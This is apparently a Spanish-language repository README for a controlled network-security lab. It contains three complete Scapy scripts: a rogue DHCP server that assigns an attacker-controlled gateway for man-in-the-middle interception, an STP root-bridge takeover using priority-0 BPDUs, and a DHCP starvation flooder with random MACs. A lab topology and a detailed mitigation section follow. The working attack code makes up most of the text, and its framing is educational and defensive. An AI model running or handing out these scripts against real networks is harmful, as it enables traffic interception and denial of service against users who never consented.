# Laboratorio de Seguridad en Redes — Ataques L2/L3 con Scapy (Entorno Controlado)

Este repositorio contiene **herramientas educativas** desarrolladas con **Scapy** para simular ataques clásicos en redes LAN y así **probar, validar y documentar controles de seguridad** en switches/infraestructura.

> ⚠️ **USO EDUCATIVO / ENTORNO CONTROLADO ÚNICAMENTE**  
> No utilices estas herramientas en redes reales sin autorización formal. El objetivo es aprender cómo se ven estos ataques y **cómo mitigarlos**.

---
<img width="1062" height="697" alt="image" src="https://github.com/user-attachments/assets/176c9766-3816-4f71-9562-a8172df1d2c3" />

## Contenido

- [1) DHCP Rogue Server (Servidor DHCP falso)](#1-dhcp-rogue-server-servidor-dhcp-falso)
- [2) STP Root Bridge Claim (Suplantación de Root Bridge)](#2-stp-root-bridge-claim-suplantación-de-root-bridge)
- [3) DHCP Starvation (Agotamiento de pool DHCP)](#3-dhcp-starvation-agotamiento-de-pool-dhcp)
- [Topología de laboratorio (VLANs, interfaces, direccionamiento)](#topología-de-laboratorio-vlans-interfaces-direccionamiento)
- [Requisitos](#requisitos)
- [Capturas de pantalla](#capturas-de-pantalla)
- [Medidas de mitigación (Defensa)](#medidas-de-mitigación-defensa)
- [Disclaimer](#disclaimer)

---

## 1) DHCP Rogue Server (Servidor DHCP falso)

### Objetivo
Simular un **servidor DHCP rogue** que responde más rápido que el servidor legítimo para que un cliente obtenga configuración manipulada (por ejemplo, **Gateway falso**), habilitando escenarios tipo **Man-in-the-Middle (MITM) a nivel L3**.

### ¿Qué demuestra?
- Qué pasa cuando un switch permite DHCP desde puertos no confiables.
- Cómo se ve el tráfico DHCP cuando existe un rogue.
- Por qué controles como **DHCP Snooping** son críticos.

### Parámetros del script
- `-i / --interface` (**requerido**): interfaz de red (ej. `eth0`)
- `--server-ip`: IP del atacante/servidor falso (default `11.63.10.50`)
- `--gateway-ip`: gateway anunciado por el rogue (default `11.63.10.50`)
- `--dns-ip`: DNS anunciado (default `8.8.8.8`)

> El script asigna IPs incrementales a víctimas y mantiene un mapeo `MAC → IP`.
>
#!/usr/bin/env python3
"""
=======================================================================
  DHCP ROGUE SERVER — Laboratorio de Seguridad en Redes
  Herramienta: Scapy
  Descripcion: Levanta un servidor DHCP falso que responde antes que
               el servidor legitimo, asignando una puerta de enlace
               controlada por el atacante (Man-in-the-Middle L3).
  USO EDUCATIVO / ENTORNO CONTROLADO UNICAMENTE
=======================================================================
"""

import os, sys, argparse, time
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    sniff, sendp, get_if_hwaddr
)
from colorama import Fore, Style, init

init(autoreset=True)

BANNER = f"""
{Fore.RED}╔══════════════════════════════════════════════════╗
║       DHCP ROGUE SERVER — Scapy Lab Tool         ║
║      Solo para entornos de prueba controlados    ║
╚══════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

# ── Configuración global del servidor falso ─────────────────────────
class ServidorFalso:
    interfaz     = "eth0"
    ip_servidor  = "11.63.10.50"   # IP del atacante en la red
    ip_gateway   = "11.63.10.50"   # GW falso → redirige tráfico al atacante
    ip_dns       = "8.8.8.8"
    mascara      = "255.255.255.0"
    lease_time   = 600             # segundos
    _contador    = 50              # primer último octeto a asignar
    _victimas: dict[str, str] = {}

cfg = ServidorFalso()

# ── Lógica de asignación de IPs ────────────────────────────────────
def obtener_ip_para(mac: str) -> str:
    if mac in cfg._victimas:
        return cfg._victimas[mac]
    base = ".".join(cfg.ip_servidor.split(".")[:3])
    nueva_ip = f"{base}.{cfg._contador}"
    cfg._contador += 1
    cfg._victimas[mac] = nueva_ip
    return nueva_ip

# ── Construcción de paquetes ────────────────────────────────────────
def _base_respuesta(pkt, tipo: str, ip_victima: str) -> Ether:
    mac_atacante = get_if_hwaddr(cfg.interfaz)
    return (
        Ether(src=mac_atacante, dst=pkt[Ether].src)
        / IP(src=cfg.ip_servidor, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(
            op=2,
            yiaddr=ip_victima,
            siaddr=cfg.ip_servidor,
            chaddr=pkt[BOOTP].chaddr,
            xid=pkt[BOOTP].xid,
        )
        / DHCP(options=[
            ("message-type", tipo),
            ("server_id",    cfg.ip_servidor),
            ("lease_time",   cfg.lease_time),
            ("subnet_mask",  cfg.mascara),
            ("router",       cfg.ip_gateway),
            ("name_server",  cfg.ip_dns),
            "end",
        ])
    )

def armar_offer(pkt, ip: str) -> Ether:
    return _base_respuesta(pkt, "offer", ip)

def armar_ack(pkt, ip: str) -> Ether:
    return _base_respuesta(pkt, "ack", ip)

# ── Procesador de paquetes capturados ──────────────────────────────
def procesar_paquete(pkt) -> None:
    if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
        return

    tipo_msg = None
    for opcion in pkt[DHCP].options:
        if isinstance(opcion, tuple) and opcion[0] == "message-type":
            tipo_msg = opcion[1]
            break

    if tipo_msg is None:
        return

    mac_victima = pkt[Ether].src

    if tipo_msg == 1:  # DISCOVER
        ip_asignada = obtener_ip_para(mac_victima)
        print(f"\n{Fore.CYAN}[→] DISCOVER recibido  | MAC víctima: {mac_victima}")
        print(f"{Fore.RED}[!] Ofreciendo IP falsa: {ip_asignada} | GW falso: {cfg.ip_gateway}")
        sendp(armar_offer(pkt, ip_asignada), iface=cfg.interfaz, verbose=False)
        print(f"{Fore.GREEN}[←] OFFER enviado → {ip_asignada}")

    elif tipo_msg == 3:  # REQUEST
        ip_asignada = obtener_ip_para(mac_victima)
        print(f"\n{Fore.CYAN}[→] REQUEST recibido   | MAC víctima: {mac_victima}")
        sendp(armar_ack(pkt, ip_asignada), iface=cfg.interfaz, verbose=False)
        print(f"{Fore.GREEN}[←] ACK enviado → {ip_asignada}")
        print(f"{Fore.RED}[✓] VÍCTIMA COMPROMETIDA:")
        print(f"{Fore.RED}    MAC : {mac_victima}")
        print(f"{Fore.RED}    IP  : {ip_asignada}")
        print(f"{Fore.RED}    GW  : {cfg.ip_gateway}  ← ATACANTE")
        print(f"{Fore.RED}    DNS : {cfg.ip_dns}")

# ── Main ─────────────────────────────────────────────────────────────
def main():
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] Este script requiere privilegios root (sudo).")
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description="DHCP Rogue Server — Herramienta educativa con Scapy"
    )
    parser.add_argument("-i", "--interface", required=True, help="Interfaz de red (ej. eth0)")
    parser.add_argument("--server-ip", default="11.63.10.50", help="IP del atacante/servidor falso")
    parser.add_argument("--gateway-ip", default="11.63.10.50", help="Gateway falso a anunciar")
    parser.add_argument("--dns-ip",     default="8.8.8.8",      help="DNS a anunciar")
    args = parser.parse_args()

    cfg.interfaz    = args.interface
    cfg.ip_servidor = args.server_ip
    cfg.ip_gateway  = args.gateway_ip
    cfg.ip_dns      = args.dns_ip

    print(BANNER)
    print(f"{Fore.YELLOW}[*] Interfaz     : {cfg.interfaz}")
    print(f"{Fore.YELLOW}[*] IP Servidor  : {cfg.ip_servidor}")
    print(f"{Fore.RED}[!] GW Falso     : {cfg.ip_gateway}")
    print(f"{Fore.RED}[!] DNS Anunciado: {cfg.ip_dns}")
    print(f"{Fore.CYAN}[*] Escuchando peticiones DHCP... CTRL+C para detener\n")

    try:
        sniff(
            iface=cfg.interfaz,
            filter="udp and (port 67 or port 68)",
            prn=procesar_paquete,
            store=False,
        )
    except KeyboardInterrupt:
        pass

    print(f"\n{Fore.CYAN}[*] Sesión finalizada.")
    print(f"{Fore.CYAN}[*] Total víctimas comprometidas: {len(cfg._victimas)}")
    for mac, ip in cfg._victimas.items():
        print(f"{Fore.RED}    {mac}  →  {ip}  (GW: {cfg.ip_gateway})")

if __name__ == "__main__":
    main()


---

## 2) STP Root Bridge Claim (Suplantación de Root Bridge)

### Objetivo
Enviar **BPDUs** con prioridad “ganadora” para intentar reclamar el rol de **Root Bridge** en STP, provocando que el tráfico L2 se reoriente (dependiendo de la topología), lo cual puede facilitar:
- intercepción,
- degradación de desempeño,
- cambios en el árbol STP.

### ¿Qué demuestra?
- Impacto de una mala protección STP en puertos de acceso.
- Importancia de **BPDU Guard**, **Root Guard** y hardening de STP.

### Parámetros del script
- `-i / --interface` (**requerido**): interfaz (ej. `eth0`)
- `-p / --priority`: prioridad del bridge (default `0`)
- `-t / --interval`: intervalo entre BPDUs en segundos (default `2.0`)
- `-c / --count`: número total de BPDUs (0 = indefinido)

> El script también incluye una verificación escuchando BPDUs para comprobar si el atacante aparece anunciado como Root.

#!/usr/bin/env python3
"""
=======================================================================
  STP ROOT BRIDGE CLAIM ATTACK — Laboratorio de Seguridad en Redes
  Herramienta: Scapy
  Descripcion: Envía BPDUs con prioridad 0 para reclamar el rol de
               Root Bridge en la topología STP, forzando que todo el
               tráfico L2 sea redirigido a través del atacante.
  USO EDUCATIVO / ENTORNO CONTROLADO UNICAMENTE
=======================================================================
"""

import os, sys, time, argparse
from scapy.all import (
    Ether, LLC, STP,
    sendp, sniff, get_if_hwaddr
)
from colorama import Fore, Style, init

init(autoreset=True)

BANNER = f"""
{Fore.RED}╔══════════════════════════════════════════════════╗
║    STP ROOT BRIDGE CLAIM — Scapy Lab Tool        ║
║      Solo para entornos de prueba controlados    ║
╚══════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

# ── Construcción del BPDU malicioso ────────────────────────────────
def construir_bpdu(interfaz: str, prioridad: int) -> Ether:
    """
    Construye un Configuration BPDU afirmando ser Root Bridge.
    prioridad=0 garantiza que ningún switch legítimo tenga menor valor.
    """
    mac = get_if_hwaddr(interfaz)
    pkt = (
        Ether(dst="01:80:c2:00:00:00", src=mac)   # dirección multicast STP
        / LLC(dsap=0x42, ssap=0x42, ctrl=3)
        / STP(
            proto      = 0,
            version    = 0,
            bpdutype   = 0x00,    # Configuration BPDU
            bpduflags  = 0x01,
            rootid     = prioridad,
            rootmac    = mac,
            pathcost   = 0,
            bridgeid   = prioridad,
            bridgemac  = mac,
            portid     = 0x8001,
            age        = 0,
            maxage     = 20,
            hellotime  = 2,
            fwddelay   = 15,
        )
    )
    return pkt

# ── Verificación de Root Bridge ─────────────────────────────────────
def verificar_root(interfaz: str, mi_mac: str, timeout: float = 2.0) -> bool:
    """
    Escucha BPDUs y comprueba si el atacante ya aparece como Root Bridge.
    Retorna True si la MAC del atacante es anunciada como Root.
    """
    capturados = []

    def capturar(pkt):
        if pkt.haslayer(STP):
            capturados.append(pkt)

    sniff(
        iface=interfaz,
        filter="ether dst 01:80:c2:00:00:00",
        prn=capturar,
        timeout=timeout,
        store=False,
    )

    for pkt in capturados:
        root_mac = str(pkt[STP].rootmac).lower()
        if root_mac == mi_mac.lower():
            print(f"{Fore.GREEN}[✓] ¡ROOT BRIDGE ADQUIRIDO! → {mi_mac}")
            print(f"{Fore.GREEN}[✓] El tráfico L2 pasa ahora por el atacante.")
            return True
        else:
            print(f"{Fore.YELLOW}[~] Root Bridge actual: {pkt[STP].rootmac}")
    return False

# ── Bucle de ataque ─────────────────────────────────────────────────
def lanzar_ataque(
    interfaz: str,
    prioridad: int,
    intervalo: float,
    total: int,
) -> None:
    mi_mac = get_if_hwaddr(interfaz)
    bpdu   = construir_bpdu(interfaz, prioridad)

    print(BANNER)
    print(f"{Fore.YELLOW}[*] Interfaz      : {interfaz}")
    print(f"{Fore.YELLOW}[*] MAC atacante   : {mi_mac}")
    print(f"{Fore.RED}[!] Prioridad BPDU : {prioridad}  (0 = máxima prioridad STP)")
    print(f"{Fore.RED}[!] Intervalo      : {intervalo}s")
    print(f"{Fore.CYAN}[*] Transmitiendo BPDUs... CTRL+C para detener\n")

    enviados = 0
    inicio   = time.time()

    try:
        while True:
            if total > 0 and enviados >= total:
                break

            sendp(bpdu, iface=interfaz, verbose=False)
            enviados += 1
            elapsed = time.time() - inicio

            print(
                f"{Fore.RED}[→] BPDU #{enviados:04d} | "
                f"Prioridad: {prioridad} | "
                f"MAC: {mi_mac} | "
                f"t={elapsed:.1f}s",
                end="\r",
            )

            # Cada 15 BPDUs verificamos si ya somos Root
            if enviados % 15 == 0:
                print()
                verificar_root(interfaz, mi_mac)

            time.sleep(intervalo)

    except KeyboardInterrupt:
        pass

    elapsed_total = time.time() - inicio
    print(f"\n\n{Fore.CYAN}[✓] BPDUs enviados    : {enviados}")
    print(f"{Fore.CYAN}[✓] Tiempo de ataque  : {elapsed_total:.1f}s")
    print(f"\n{Fore.YELLOW}[*] Verificación final de Root Bridge...")
    exito = verificar_root(interfaz, mi_mac, timeout=3.0)
    if not exito:
        print(f"{Fore.RED}[!] No se confirma Root Bridge. Puede requerir más tiempo.")

# ── Main ─────────────────────────────────────────────────────────────
def main():
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] Este script requiere privilegios root (sudo).")
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description="STP Root Bridge Claim Attack — Herramienta educativa con Scapy"
    )
    parser.add_argument("-i", "--interface", required=True, help="Interfaz de red (ej. eth0)")
    parser.add_argument(
        "-p", "--priority", type=int, default=0,
        help="Prioridad del bridge (0=máxima, default=0)"
    )
    parser.add_argument(
        "-t", "--interval", type=float, default=2.0,
        help="Intervalo entre BPDUs en segundos (default=2.0)"
    )
    parser.add_argument(
        "-c", "--count", type=int, default=0,
        help="Total de BPDUs a enviar (0=infinito)"
    )
    args = parser.parse_args()

    lanzar_ataque(args.interface, args.priority, args.interval, args.count)

if __name__ == "__main__":
    main()

---

## 3) DHCP Starvation (Agotamiento de pool DHCP)

### Objetivo
Simular un **DHCP Starvation**, enviando múltiples DHCP Discover con **MACs aleatorias**, con el fin de **agotar el pool** del servidor DHCP legítimo y causar denegación de servicio a nuevos clientes.

### ¿Qué demuestra?
- Cómo un atacante puede consumir leases si no hay controles.
- Por qué se necesitan límites/seguridad en puertos de acceso.

### Parámetros del script
- `-i / --interface` (**requerido**): interfaz (ej. `eth0`)
- `-c / --count`: cantidad de paquetes (0 = indefinido)
- `-d / --delay`: delay entre paquetes en segundos (default `0.05`)

  #!/usr/bin/env python3
"""
=======================================================================
  DHCP STARVATION ATTACK — Laboratorio de Seguridad en Redes
  Herramienta: Scapy
  Descripcion: Agota el pool de IPs del servidor DHCP enviando
               multiples DHCP Discover con MACs aleatorias.
  USO EDUCATIVO / ENTORNO CONTROLADO UNICAMENTE
=======================================================================
"""

import os, sys, random, time, argparse
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp
from colorama import Fore, Style, init

init(autoreset=True)

BANNER = f"""
{Fore.RED}╔══════════════════════════════════════════════════╗
║         DHCP STARVATION — Scapy Lab Tool         ║
║      Solo para entornos de prueba controlados    ║
╚══════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

def generar_mac_aleatoria() -> str:
    """Genera una MAC con OUI 02: (bit administrado localmente)."""
    octetos = [random.randint(0, 255) for _ in range(5)]
    return "02:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}".format(*octetos)

def construir_discover(mac_src: str) -> Ether:
    """Construye un paquete DHCP Discover con la MAC indicada."""
    mac_bytes = bytes.fromhex(mac_src.replace(":", ""))
    xid_random = random.randint(1, 0xFFFF_FFFF)

    pkt = (
        Ether(src=mac_src, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(chaddr=mac_bytes, xid=xid_random, flags=0x8000)
        / DHCP(options=[("message-type", "discover"), "end"])
    )
    return pkt

def lanzar_ataque(interfaz: str, total: int, intervalo: float) -> None:
    """Bucle principal del ataque de agotamiento DHCP."""
    enviados = 0
    inicio = time.time()
    modo = "Infinito" if total == 0 else str(total)

    print(BANNER)
    print(f"{Fore.YELLOW}[*] Interfaz  : {interfaz}")
    print(f"{Fore.YELLOW}[*] Paquetes  : {modo}")
    print(f"{Fore.YELLOW}[*] Intervalo : {intervalo}s")
    print(f"{Fore.CYAN}[*] Iniciando agotamiento DHCP... CTRL+C para detener\n")

    try:
        while True:
            if total > 0 and enviados >= total:
                break

            mac = generar_mac_aleatoria()
            paquete = construir_discover(mac)
            sendp(paquete, iface=interfaz, verbose=False)
            enviados += 1

            elapsed = time.time() - inicio
            tasa = enviados / elapsed if elapsed > 0 else 0.0

            print(
                f"{Fore.GREEN}[→] #{enviados:05d} | "
                f"MAC: {mac} | "
                f"Tasa: {tasa:.1f} pkt/s",
                end="\r",
            )
            time.sleep(intervalo)

    except KeyboardInterrupt:
        print()

    elapsed_total = time.time() - inicio
    print(f"\n{Fore.CYAN}[✓] Paquetes enviados : {enviados}")
    print(f"{Fore.CYAN}[✓] Tiempo total      : {elapsed_total:.1f}s")
    print(f"{Fore.CYAN}[✓] Tasa promedio     : {enviados/elapsed_total:.1f} pkt/s" if elapsed_total > 0 else "")
    print(f"{Fore.RED}\n[!] Ataque finalizado. Verifique el pool DHCP en el servidor.\n")

def main():
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] Este script requiere privilegios root (sudo).")
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description="DHCP Starvation Attack — Herramienta educativa con Scapy"
    )
    parser.add_argument("-i", "--interface", required=True, help="Interfaz de red (ej. eth0)")
    parser.add_argument("-c", "--count", type=int, default=0, help="Num. de paquetes (0=infinito)")
    parser.add_argument("-d", "--delay", type=float, default=0.05, help="Intervalo entre paquetes (seg)")
    args = parser.parse_args()

    lanzar_ataque(args.interface, args.count, args.delay)

if __name__ == "__main__":
    main()


---

# Topología de laboratorio (VLANs, interfaces, direccionamiento)
## Dispositivos sugeridos
- **SW1 (L2)**: switch administrable con soporte STP, DHCP Snooping (ideal si es IOSvL2 o un switch real).
- **DHCP-SRV (legítimo)**: servidor DHCP (Linux/Windows/Router).
- **VICTIM-1 / VICTIM-2**: PCs cliente DHCP.
- **ATTACKER (Kali/Ubuntu)**: host con Python3 + Scapy.

## VLANs
- **VLAN 10**: Usuarios/Lab (DHCP)
- (Opcional) **VLAN 99**: Management

## Puertos / Interfaces (ejemplo)
- SW1 `Gi0/1` → DHCP-SRV (uplink/servidor)
- SW1 `Gi0/2` → VICTIM-1
- SW1 `Gi0/3` → VICTIM-2
- SW1 `Gi0/4` → ATTACKER

## Direccionamiento (ejemplo basado en tu script)
- Red VLAN10: `11.63.10.0/24`
- DHCP legítimo: `11.63.10.10`
- Atacante: `11.63.10.50`
- Gateway legítimo: `11.63.10.1`
- **Gateway falso anunciado** (rogue): `11.63.10.50`

---

# Requisitos

## Sistema
- Linux (Kali/Ubuntu recomendado en laboratorio)
- Acceso root (`sudo`) para sniffing y envío de paquetes raw

## Dependencias
- Python 3.x
- Scapy
- Colorama
Medidas de mitigación (Defensa)

Esta sección resume cómo proteger la red contra los 3 escenarios.

A) Mitigación contra DHCP Rogue Server
1) DHCP Snooping (control principal)

Marcar solo los puertos hacia el servidor DHCP como trusted

Puertos de usuarios/PCs como untrusted

Bloquea DHCP Offer/Ack no autorizados desde puertos untrusted

Complementos recomendados

DHCP Snooping binding table para validar clientes

Guardar bindings en almacenamiento persistente si el switch lo soporta

2) Dynamic ARP Inspection (DAI)

Evita ARP spoofing usando la tabla de bindings (DHCP Snooping)

Muy útil si el objetivo del rogue es preparar MITM

3) IP Source Guard

Restringe IP/MAC por puerto basado en bindings DHCP

Previene suplantación IP desde hosts comprometidos

4) Port Security (capa extra)

Limitar MACs por puerto (ej. 1 o 2)

Acción ante violación: restrict/shutdown (según política)

5) Segmentación y control

VLANs por rol (usuarios/infra/servers)

ACLs y políticas L3 para reducir movimiento lateral

B) Mitigación contra STP Root Bridge Claim
1) BPDU Guard (en puertos de acceso)

Si un puerto “de usuario” recibe BPDUs → se protege (err-disable/shutdown)

Ideal para evitar que un host intente participar en STP

2) Root Guard (en puertos donde NO debe aparecer un Root alterno)

Evita que un switch aguas abajo reclame Root en enlaces donde no corresponde

3) STP Hardening (buenas prácticas)

Definir explícitamente el Root Bridge (prioridades controladas)

Usar PortFast solo en puertos de acceso (con BPDU Guard)

Documentar el diseño STP (qué switch es root, qué puertos son trunks)

4) Control de acceso físico/lógico

Puertos no usados: shutdown + VLAN “blackhole”

802.1X (si aplica) para acceso autenticado

C) Mitigación contra DHCP Starvation
1) DHCP Snooping + Rate Limiting

Muchos switches permiten limitar tasa DHCP en puertos untrusted

Reduce la capacidad de inundación

2) Port Security (muy efectivo aquí)

Si el ataque usa muchas MACs aleatorias:

limitar a 1-2 MAC por puerto

bloquear cuando cambie/crezca el conteo

3) Ajustes en el servidor DHCP

Leases razonables (no excesivamente largos)

Reservas por MAC para equipos críticos (donde aplique)

Alertas/monitoreo por consumo anormal de pool

4) Monitoreo y detección

Alertar si:

el pool baja rápidamente

hay demasiados Discover por segundo

hay “churn” excesivo de leases

Disclaimer

Este repositorio tiene fines académicos y defensivos, orientado a:

comprender el ataque,

capturar evidencias,

validar controles (DHCP Snooping, BPDU Guard, etc.),

y documentar resultados en un entorno controlado.

El autor no se responsabiliza del uso indebido fuera de un laboratorio autorizado.

